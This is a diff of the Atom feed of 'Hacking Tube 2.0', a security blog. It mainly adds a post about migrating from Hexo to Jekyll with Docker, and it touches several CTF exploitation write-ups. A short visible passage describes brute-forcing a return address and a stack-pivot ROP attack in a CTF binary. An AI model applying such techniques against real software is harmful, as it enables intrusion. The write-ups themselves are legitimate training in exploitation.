@@ -1,6 +1,102 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2018-09-28T00:08:13+08:00</updated><id>http://0.0.0.0:4000/</id><title type="html">Hacking Tube 2.0</title><subtitle>Security and stuff</subtitle><author><name>Bruce Chen</name></author><entry><title type="html">Chakrazy – exploiting type confusion bug in ChakraCore engine</title><link href="http://0.0.0.0:4000/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="alternate" type="text/html" title="Chakrazy -- exploiting type confusion bug in ChakraCore engine" /><published>2017-12-26T19:12:00+08:00</published><updated>2017-12-26T19:12:00+08:00</updated><id>http://0.0.0.0:4000/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore</id><content type="html" xml:base="http://0.0.0.0:4000/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/">&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2018-09-28T22:56:18+08:00</updated><id>http://0.0.0.0:4000/</id><title type="html">Hacking Tube 2.0</title><subtitle>Security and stuff</subtitle><author><name>Bruce Chen</name></author><entry><title type="html">Some notes on migrating to Jekyll</title><link href="http://0.0.0.0:4000/some-notes-on-migrating-to-jekyll/" rel="alternate" type="text/html" title="Some notes on migrating to Jekyll" /><published>2018-09-28T00:00:00+08:00</published><updated>2018-09-28T00:00:00+08:00</updated><id>http://0.0.0.0:4000/some-notes-on-migrating-to-jekyll</id><content type="html" xml:base="http://0.0.0.0:4000/some-notes-on-migrating-to-jekyll/">&lt;p&gt;Recently I’ve decided to migrate my blogging framework from &lt;a href=&quot;https://hexo.io/zh-tw/&quot;&gt;Hexo&lt;/a&gt; to &lt;a href=&quot;https://jekyllrb.com/&quot;&gt;Jekyll&lt;/a&gt;. Here are some notes that I took for recording the migration process.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://ctftime.org/task/4088&quot;&gt;Chakrazy&lt;/a&gt; is a browser CTF challenge created by team PPP for the &lt;a href=&quot;https://ctftime.org/event/439&quot;&gt;2017 PlaidCTF event&lt;/a&gt;. It’s a challenge based on Microsoft’s ChakraCore Javascript engine. You can download the challenge file &lt;a href=&quot;https://drive.google.com/file/d/1aaDLRdl19ffT1-pn_9o4gNTcbR9kwypG/view?usp=sharing&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;!-- more --&gt;
+
+&lt;h2 id=&quot;install-jekyll&quot;&gt;Install Jekyll&lt;/h2&gt;
+&lt;p&gt;Here I created a &lt;a href=&quot;https://github.com/bruce30262/docker-misc/blob/master/jekyll-blog/Dockerfile&quot;&gt;Dockerfile&lt;/a&gt; for my blogging environment.&lt;/p&gt;
+
+&lt;h3 id=&quot;from-hexo-to-jekyll&quot;&gt;From Hexo to Jekyll&lt;/h3&gt;
+&lt;p&gt;Since I’m migrating to Jekyll, I had to clean my &lt;a href=&quot;https://github.com/bruce30262/bruce30262.github.io&quot;&gt;bruce30262.github.io&lt;/a&gt; repository and use Jekyll to build a new one. Here’s what I did:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Remove all the contents inside the repo ( except the &lt;code class=&quot;highlighter-rouge&quot;&gt;.git&lt;/code&gt; directory ).&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll new myblog&lt;/code&gt; to create a new blog.&lt;/li&gt;
+  &lt;li&gt;Move all the files from &lt;code class=&quot;highlighter-rouge&quot;&gt;myblog&lt;/code&gt; to the root directory, then remove &lt;code class=&quot;highlighter-rouge&quot;&gt;myblog&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Add a new Gemfile.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bundle install&lt;/code&gt; to install the gems.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;One of the problem I’ve encountered is that &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll-admin&lt;/code&gt; was not installed even if I put it in my Gemfile. I had to use &lt;code class=&quot;highlighter-rouge&quot;&gt;gem install jekyll-admin&lt;/code&gt; to fix the issue.&lt;/p&gt;
+
+&lt;p&gt;After that we can launch the blog with &lt;code class=&quot;highlighter-rouge&quot;&gt;bundle exec jekyll serve --host=0.0.0.0&lt;/code&gt;, then go to &lt;code class=&quot;highlighter-rouge&quot;&gt;0.0.0.0:4000&lt;/code&gt; to see if it work. To manage the blog just go to &lt;code class=&quot;highlighter-rouge&quot;&gt;0.0.0.0:4000/admin&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;working-inside-docker&quot;&gt;Working inside Docker&lt;/h3&gt;
+&lt;p&gt;We can mount our working directory to the container and start working inside the docker with the following command:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IMG=&quot;some image name&quot;
+CTN=&quot;some container name&quot;
+
+docker run -e TERM --privileged --security-opt seccomp:unconfined -p 4000:4000 -v ~/bruce30262.github.io:/app --name=$(CTN) -it bruce30262/$(IMG) /bin/bash -c 'cd /app &amp;amp;&amp;amp; bundle exec jekyll serve --host 0.0.0.0'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The Jekyll docker container uses user &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll&lt;/code&gt; ( uid = 1000 ) to configure the blog, so it’ll be the best if your own uid on the linux host is also 1000, making you able to work both outside/inside the docker ( since you have the same uid, working as jekyll inside the docker = working as yourself on the linux host ) without having the permission problem.&lt;/p&gt;
+
+&lt;h2 id=&quot;install-the-theme&quot;&gt;Install the theme&lt;/h2&gt;
+&lt;p&gt;I’m using &lt;a href=&quot;https://mmistakes.github.io/minimal-mistakes/&quot;&gt;Minimal Mistakes&lt;/a&gt; as my theme. I like its dark theme, also it’s well documented :).&lt;/p&gt;
+
+&lt;p&gt;To use the theme on github page you’ll have to use the &lt;code class=&quot;highlighter-rouge&quot;&gt;remote-theme&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remote_theme: bruce30262/minimal-mistakes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After that you can just follow the step in the &lt;a href=&quot;https://mmistakes.github.io/minimal-mistakes/docs/configuration/&quot;&gt;documentation&lt;/a&gt; to configure all the thing. The &lt;a href=&quot;https://github.com/mmistakes/minimal-mistakes/blob/master/docs/_config.yml&quot;&gt;offcial config setting&lt;/a&gt; is also worth reading.&lt;/p&gt;
+
+&lt;h3 id=&quot;customizing-the-theme&quot;&gt;Customizing the theme&lt;/h3&gt;
+
+&lt;p&gt;I’ve &lt;a href=&quot;https://github.com/bruce30262/minimal-mistakes&quot;&gt;forked the theme repo&lt;/a&gt; so I can apply my own customized theme to the blog.&lt;/p&gt;
+
+&lt;p&gt;For example I don’t like the syntax highlighting in the dark theme and preferred the default one, so I follow the steps mentioned in &lt;a href=&quot;https://github.com/mmistakes/minimal-mistakes/issues/1458&quot;&gt;this issue&lt;/a&gt; and modified the content of &lt;code class=&quot;highlighter-rouge&quot;&gt;assets/css/main.scss&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-css highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;@import&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&quot;minimal-mistakes/skins/dark&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;skin&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;/* default syntax highlighting (base16) */&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#263238&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; 
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#2e3c43&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base02&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#314549&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base03&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#546e7a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#b2ccd6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base05&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#eeffff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base06&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#eeffff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base07&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#ffffff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base08&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#f07178&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#f78c6c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base0a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#ffcb6b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base0b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#c3e88d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base0c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#89ddff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base0d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#82aaff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base0e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#c792ea&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;base0f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#ff5370&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;@import&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&quot;minimal-mistakes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;partials&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;For the color code you can just check the &lt;a href=&quot;https://mmistakes.github.io/minimal-mistakes/docs/stylesheets/#colors&quot;&gt;documentation&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;migrating-disqus-comment&quot;&gt;Migrating Disqus comment&lt;/h3&gt;
+
+&lt;p&gt;Migrating Disqus comment to a new blog is always a troublesome :/&lt;/p&gt;
+
+&lt;p&gt;To enable the disqus feature use the &lt;code class=&quot;highlighter-rouge&quot;&gt;comments&lt;/code&gt; setting in &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;comments:
+  provider: &quot;disqus&quot;
+  disqus:
+    shortname: (disqus_shortname)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Also make sure to set the &lt;code class=&quot;highlighter-rouge&quot;&gt;url&lt;/code&gt; key in &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt; if you’re using the github page, or else the &lt;a href=&quot;https://github.com/bruce30262/bruce30262.github.io/blob/master/_site/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/index.html#L863&quot;&gt;disqus_config function&lt;/a&gt; will not work.&lt;/p&gt;
+
+&lt;p&gt;After that, follow the steps from the &lt;a href=&quot;https://help.disqus.com/import-export-and-syncing/url-mapper&quot;&gt;disqus website&lt;/a&gt;, use the URL Mapper to migrate the threads.&lt;/p&gt;
+
+&lt;h2 id=&quot;migrate-the-blog-posts&quot;&gt;Migrate the blog posts&lt;/h2&gt;
+&lt;p&gt;Simply copy the markdown files to the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; folder. Remember to rename those files that don’t fit the Jekyll naming convention ( &lt;code class=&quot;highlighter-rouge&quot;&gt;yyyy-mm-dd-title.md&lt;/code&gt;). Also in order to show the &lt;code class=&quot;highlighter-rouge&quot;&gt;autho_profile&lt;/code&gt; ( left side of the page ), you’ll have to remove the &lt;code class=&quot;highlighter-rouge&quot;&gt;author&lt;/code&gt; metadata field in each post.&lt;/p&gt;
+
+&lt;p&gt;After that just fix some format ( especially the code hightlighting ) and  we’re all good.&lt;/p&gt;
+
+&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/StartoverX/p/8996725.html&quot;&gt;Github pages + Minimal-Mistakes + Disqus&lt;/a&gt; (Chinese)&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/mmistakes/minimal-mistakes&quot;&gt;Minimal Mistakes&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://blog.webjeda.com/jekyll-sitemap/&quot;&gt;Adding Sitemap To Jekyll Blog&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Bruce Chen</name></author><category term="Jekyll" /><category term="Ruby" /><category term="git" /><category term="docker" /><summary type="html">Recently I’ve decided to migrate my blogging framework from Hexo to Jekyll. Here are some notes that I took for recording the migration process.</summary></entry><entry><title type="html">Chakrazy – exploiting type confusion bug in ChakraCore engine</title><link href="http://0.0.0.0:4000/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="alternate" type="text/html" title="Chakrazy -- exploiting type confusion bug in ChakraCore engine" /><published>2017-12-26T19:12:00+08:00</published><updated>2017-12-26T19:12:00+08:00</updated><id>http://0.0.0.0:4000/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore</id><content type="html" xml:base="http://0.0.0.0:4000/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/">&lt;p&gt;&lt;a href=&quot;https://ctftime.org/task/4088&quot;&gt;Chakrazy&lt;/a&gt; is a browser CTF challenge created by team PPP for the &lt;a href=&quot;https://ctftime.org/event/439&quot;&gt;2017 PlaidCTF event&lt;/a&gt;. It’s a challenge based on Microsoft’s ChakraCore Javascript engine. You can download the challenge file &lt;a href=&quot;https://drive.google.com/file/d/1aaDLRdl19ffT1-pn_9o4gNTcbR9kwypG/view?usp=sharing&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
 
 &lt;!-- more --&gt;
 
@@ -363,9 +459,7 @@ index a666b0b..0e8a073 100644
   &lt;li&gt;&lt;a href=&quot;http://conference.hitb.org/hitbsecconf2017ams/materials/D1T2%20-%20Linan%20Hao%20and%20Long%20Liu%20-%20The%20Secret%20of%20ChakraCore.pdf&quot;&gt;The Secret of ChakraCore: 10 Ways to Go Beyond the Edge&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://www.blackhat.com/docs/us-17/thursday/us-17-Silvanovich-The-Origin-Of-Array-Symbol-Species.pdf&quot;&gt;The Origin of Array [@@species]&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;http://mashirogod.dothome.co.kr/index.php/2017/01/07/first-step-to-browser-exploitation/&quot;&gt;First Step to Browser Exploitation (Korean)&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Bruce Chen</name></author><category term="CTF" /><category term="Pwnable" /><category term="Javascript" /><category term="Plaid" /><category term="Edge" /><category term="ChakraCore" /><category term="Browser" /><category term="type_confusion" /><summary type="html">Introduction</summary></entry><entry><title type="html">Learning browser exploitation via 33C3 CTF feuerfuchs challenge</title><link href="http://0.0.0.0:4000/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="alternate" type="text/html" title="Learning browser exploitation via 33C3 CTF  feuerfuchs challenge" /><published>2017-12-16T05:24:00+08:00</published><updated>2017-12-16T05:24:00+08:00</updated><id>http://0.0.0.0:4000/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge</id><content type="html" xml:base="http://0.0.0.0:4000/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/">&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
-
-&lt;p&gt;So I’ve been playing with the browser exploitation recently, by studying some browser CTF challenges. So far I’ve tried &lt;a href=&quot;http://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16&quot;&gt;qwn2own&lt;/a&gt;, &lt;a href=&quot;https://tradahacking.vn/hitb-2017-writeup-sgx-browser-5c1c48e0d6fe&quot;&gt;SGX_Browser&lt;/a&gt; and &lt;a href=&quot;https://github.com/saelo/feuerfuchs&quot;&gt;feuerfuchs&lt;/a&gt;.&lt;/p&gt;
+&lt;/ul&gt;</content><author><name>Bruce Chen</name></author><category term="CTF" /><category term="Pwnable" /><category term="Javascript" /><category term="Plaid" /><category term="Edge" /><category term="ChakraCore" /><category term="Browser" /><category term="type_confusion" /><summary type="html">Chakrazy is a browser CTF challenge created by team PPP for the 2017 PlaidCTF event. It’s a challenge based on Microsoft’s ChakraCore Javascript engine. You can download the challenge file here.</summary></entry><entry><title type="html">Learning browser exploitation via 33C3 CTF feuerfuchs challenge</title><link href="http://0.0.0.0:4000/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="alternate" type="text/html" title="Learning browser exploitation via 33C3 CTF  feuerfuchs challenge" /><published>2017-12-16T05:24:00+08:00</published><updated>2017-12-16T05:24:00+08:00</updated><id>http://0.0.0.0:4000/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge</id><content type="html" xml:base="http://0.0.0.0:4000/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/">&lt;p&gt;So I’ve been playing with the browser exploitation recently, by studying some browser CTF challenges. So far I’ve tried &lt;a href=&quot;http://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16&quot;&gt;qwn2own&lt;/a&gt;, &lt;a href=&quot;https://tradahacking.vn/hitb-2017-writeup-sgx-browser-5c1c48e0d6fe&quot;&gt;SGX_Browser&lt;/a&gt; and &lt;a href=&quot;https://github.com/saelo/feuerfuchs&quot;&gt;feuerfuchs&lt;/a&gt;.&lt;/p&gt;
 
 &lt;!-- more --&gt;
 
@@ -678,7 +772,7 @@ The exploit function start at line 233:&lt;/p&gt;
   &lt;li&gt;&lt;a href=&quot;https://github.com/ricardoquesada/Spidermonkey/blob/master/js/public/Value.h&quot;&gt;SpiderMonkey source code: Value.h&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray&quot;&gt;TypedArray on MDN&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/copyWithin&quot;&gt;copyWithin on MDN&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Bruce Chen</name></author><category term="33C3" /><category term="Firefox" /><category term="Browser" /><category term="SpiderMonkey" /><category term="Javascript" /><category term="CTF" /><category term="Pwnable" /><summary type="html">Introduction</summary></entry><entry><title type="html">hxp CTF 2017 – hardened_flag_store</title><link href="http://0.0.0.0:4000/hxp-CTF-2017-hardened-flag-store/" rel="alternate" type="text/html" title="hxp CTF 2017 -- hardened_flag_store" /><published>2017-11-21T03:18:00+08:00</published><updated>2017-11-21T03:18:00+08:00</updated><id>http://0.0.0.0:4000/hxp-CTF-2017-hardened-flag-store</id><content type="html" xml:base="http://0.0.0.0:4000/hxp-CTF-2017-hardened-flag-store/">&lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Pwnable&lt;/p&gt;
+&lt;/ul&gt;</content><author><name>Bruce Chen</name></author><category term="33C3" /><category term="Firefox" /><category term="Browser" /><category term="SpiderMonkey" /><category term="Javascript" /><category term="CTF" /><category term="Pwnable" /><summary type="html">So I’ve been playing with the browser exploitation recently, by studying some browser CTF challenges. So far I’ve tried qwn2own, SGX_Browser and feuerfuchs.</summary></entry><entry><title type="html">hxp CTF 2017 – hardened_flag_store</title><link href="http://0.0.0.0:4000/hxp-CTF-2017-hardened-flag-store/" rel="alternate" type="text/html" title="hxp CTF 2017 -- hardened_flag_store" /><published>2017-11-21T03:18:00+08:00</published><updated>2017-11-21T03:18:00+08:00</updated><id>http://0.0.0.0:4000/hxp-CTF-2017-hardened-flag-store</id><content type="html" xml:base="http://0.0.0.0:4000/hxp-CTF-2017-hardened-flag-store/">&lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Pwnable&lt;/p&gt;
 
 &lt;p&gt;64 bit ELF with PIE, NX, FULL RELRO enabled&lt;/p&gt;
 
@@ -1410,7 +1504,7 @@ Description: AAAA�N���
 
 &lt;!-- more --&gt;
 
-&lt;h1 id=&quot;installing-hexo&quot;&gt;Installing Hexo&lt;/h1&gt;
+&lt;h2 id=&quot;installing-hexo&quot;&gt;Installing Hexo&lt;/h2&gt;
 &lt;p&gt;I chose &lt;a href=&quot;https://hexo.io/zh-tw/&quot;&gt;Hexo&lt;/a&gt; for my blog framework.&lt;/p&gt;
 
 &lt;h2 id=&quot;environment-setting&quot;&gt;Environment Setting&lt;/h2&gt;
@@ -1907,192 +2001,4 @@ call    do_main
 
 &lt;p&gt;Later did I know (thanks to teammate &lt;a href=&quot;https://poning.me/&quot;&gt;Isaac&lt;/a&gt;) that there’s a thing call &lt;a href=&quot;https://www.hex-rays.com/products/ida/tech/flirt/index.shtml&quot;&gt;FLIRT&lt;/a&gt; in IDA Pro, which can help the user identify the function call in libc. All we need to do is download a FLIRT signature database from github ( &lt;a href=&quot;https://github.com/push0ebp/sig-database&quot;&gt;here’s&lt;/a&gt; the DB I used for this challenge ), and use &lt;strong&gt;FILE –&amp;gt; Load File –&amp;gt; FLIRT signature file&lt;/strong&gt; to load the database. IDA will then identify the function name, making the reverse engineering less painful. By using this technique, we’ll be able to identify some libc function, even the location of &lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;And that’s when I found that the “self-implement random” function is actually just &lt;code class=&quot;highlighter-rouge&quot;&gt;srand()&lt;/code&gt; &amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;rand()&lt;/code&gt; in libc. According to &lt;a href=&quot;https://github.com/mehQQ&quot;&gt;meh&lt;/a&gt; from HITCON, you can just brute-force the desired return address. Moreover, because the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer address is right under the return address, so you can just use &lt;code class=&quot;highlighter-rouge&quot;&gt;pop esp; ret&lt;/code&gt; to migrate the stack into &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer, and do the ROP attack. Guess I still got a lot of shit to learn :/&lt;/p&gt;</content><author><name>Bruce Chen</name></author><category term="Python" /><category term="C" /><category term="DEFCON" /><category term="CTF" /><category term="Pwnable" /><category term="ROP" /><category term="BOF" /><category term="file_stream_pointer_overflow" /><summary type="html">Category: Potent Pwnables</summary></entry><entry><title type="html">33C3 CTF 2016 – rec</title><link href="http://0.0.0.0:4000/33c3-ctf-2016-rec/" rel="alternate" type="text/html" title="33C3 CTF 2016 -- rec" /><published>2016-12-30T01:38:00+08:00</published><updated>2016-12-30T01:38:00+08:00</updated><id>http://0.0.0.0:4000/33c3-ctf-2016-rec</id><content type="html" 